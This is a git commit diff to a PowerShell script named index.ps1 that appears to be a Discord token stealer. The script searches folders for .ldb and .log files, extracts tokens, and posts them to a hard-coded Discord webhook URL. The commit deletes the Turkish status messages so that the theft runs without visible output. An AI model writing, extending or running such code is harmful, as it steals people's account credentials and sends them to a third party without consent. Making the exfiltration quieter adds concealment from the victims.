e5b049039337bd436a631493836dd8dac24e6495
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-06-30 01:10:16 +0300

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -6,7 +6,6 @@ $paths = @(
 
 foreach ($path in $paths) {
     if (Test-Path $path) {
-        Write-Host "[:fire:] Dizin bulundu: $path" -ForegroundColor Green
         $files = Get-ChildItem -Path $path -Include *.ldb, *.log -Recurse -ErrorAction SilentlyContinue
         foreach ($file in $files) {
             $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
@@ -24,9 +23,7 @@ foreach ($path in $paths) {
 
                 try {
                     Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1382366500777754786/sjFYA4Lh_9oTWZXM4L_ehRA7RagtJKDwxQ23xZT8-cUTYyQErTZWp-e977lclWd6PQX9" -Method Post -Body $body -ContentType "application/json"
-                    Write-Host "[:outbox_tray:] POST atıldı: $joinedTokens" -ForegroundColor Cyan
                 } catch {
-                    Write-Host "[:broken_heart:] POST başarısız: $_" -ForegroundColor Red
                 }
             }
         }
